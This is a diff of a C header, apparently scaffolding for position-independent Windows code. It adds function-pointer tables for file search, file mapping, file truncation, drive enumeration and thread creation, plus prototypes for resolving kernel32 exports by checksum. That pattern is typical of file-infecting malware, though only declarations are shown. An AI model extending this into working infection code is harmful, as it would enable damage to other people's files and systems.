@@ -3,6 +3,7 @@
 #include <windows.h>
 
 #include "ass.h"
+#include "checksum.h"
 #include "checksum_list.h"
 
 //BEWARE: Maybe define calling convenctions? Would be WINAPI
@@ -29,15 +30,37 @@ typedef DWORD(*fpGetLogicalDrives(void));
 typedef VOID(*fpSleep(DWORD));
 
 typedef struct {
-   uint8_t* imageBase;
-   uint8_t* kernel32Base;
-}Data;
+    fpExitProcess* exitProcess;
+    fpGetTickCount* getTickCount;
+    fpGetProcessHeap* getProcessHeap;
+    fpHeapAlloc* heapAlloc;
+    fpHeapFree* heapFree;
+    fpFindFirstFileA* findFirstFileA;
+    fpFindNextFileA* findNextFileA;
+    fpFindClose* findClose;
+    fpCreateFileA* createFileA;
+    fpGetFileSize* getFileSize;
+    fpCreateFileMappingA* createFileMappingA;
+    fpMapViewOfFile* mapViewOfFile;
+    fpFlushViewOfFile* flushViewOfFile;
+    fpUnmapViewOfFile* unmapViewOfFile;
+    fpSetFilePointer* setFilePointer;
+    fpSetEndOfFile* setEndOfFile;
+    fpCloseHandle* closeHandle;
+    //fpCopyMemory* copyMemory;
+    fpCreateThread* createThread;
+    fpGetLogicalDrives* getLogicalDrives;
+    fpSleep* sleep;
+}functions_t;
 
 typedef struct {
+   uint8_t* imageBase;
+   uint8_t* kernel32Base;
+   functions_t functions;
+}data_t;
 
-
-}Functions;
 
 void start_code(void);
 int run(void);
-uint32_t GetAddressByChecksum(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, uint32_t cs);
+void* GetAddressByChecksum(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, uint32_t cs);
+int FillAddresses(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, functions_t* functions);
